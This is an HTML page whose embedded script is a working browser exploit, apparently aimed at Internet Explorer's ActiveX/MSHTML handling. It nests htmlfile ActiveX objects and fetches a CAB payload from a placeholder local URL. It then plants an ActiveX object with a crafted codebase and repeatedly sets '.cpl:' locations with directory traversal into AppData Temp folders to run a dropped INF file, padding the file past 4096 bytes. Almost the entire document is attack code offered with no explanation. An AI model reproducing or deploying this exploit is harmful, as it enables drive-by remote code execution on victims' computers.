<!DOCTYPE html>
<html>
 <head>
  <meta http-equiv="Expires" content="-1">
  <meta http-equiv="X-UA-Compatible" content="IE=11">
 </head>
 <body>
  <script>

let payload_path = "http://127.0.0.1/pwn.cab";
let payload_name = "pwnge.inf"

var iframe = document.createElement("iframe");
try {
  document.body.appendChild(iframe);
} catch (e) {
  window.documentElement.appendChild(iframe);
}

iframe.contentDocument.open().close();
try {
  document.body.removeChild(iframe);
} catch (e) {
  window.documentElement.removeChild(iframe);
}

var activex_obj1 = new ActiveXObject("htmlfile");
activex_obj1.open().close();

var ax_script_obj1 = new activex_obj1.Script.ActiveXObject("htmlFile");
ax_script_obj1.open().close();
var ax_script_obj2 = new ax_script_obj1.Script.ActiveXObject("htmlFile");
ax_script_obj2.open().close();

// Ensure caching occurs when exploit runs on a fresh machine
xmlhttprequest = new XMLHttpRequest();
xmlhttprequest.open("GET", payload_path, true);
xmlhttprequest.send();

// Crafting custom ActiveX Control object
ax_script_obj2.Script.document.write("<body>");
var object_element = ax_script_obj2.Script.document.createElement('object');
object_element.setAttribute('codebase', payload_path + "#version=5,0,0,0");
object_element.setAttribute('classid', "CLSID:edbc374c-5730-432a-b5b8-de94f0b57217");
ax_script_obj2.Script.document.body.appendChild(object_element);

var activex_obj2 = new ActiveXObject('htmlfile');

activex_obj2.Script.location = ".cpl:../../../../../../../../AppData/Local/Temp/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../../../../AppData/Local/Temp/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../../../AppData/Local/Temp/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../../AppData/Local/Temp/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../AppData/Local/Temp/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../AppData/Local/Temp/" + payload_name;
activex_obj2.Script.location = ".cpl:../../AppData/Local/Temp/" + payload_name;

activex_obj2.Script.location = ".cpl:../../../../../../../../AppData/Local/Temp/Low/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../../../../AppData/Local/Temp/Low/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../../../AppData/Local/Temp/Low/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../../AppData/Local/Temp/Low/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../../AppData/Local/Temp/Low/" + payload_name;
activex_obj2.Script.location = ".cpl:../../../AppData/Local/Temp/Low/" + payload_name;
activex_obj2.Script.location = ".cpl:../../AppData/Local/Temp/Low/" + payload_name;

activex_obj2.Script.location = ".cpl:../../../../" + payload_name;
activex_obj2.Script.location = ".cpl:../../../" + payload_name;
activex_obj2.Script.location = ".cpl:../../" + payload_name;
activex_obj2.Script.location = ".cpl:../../" + payload_name;

/* Some Padding to get over 4096 bytes AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*/

  </script>
 </body>
</html>
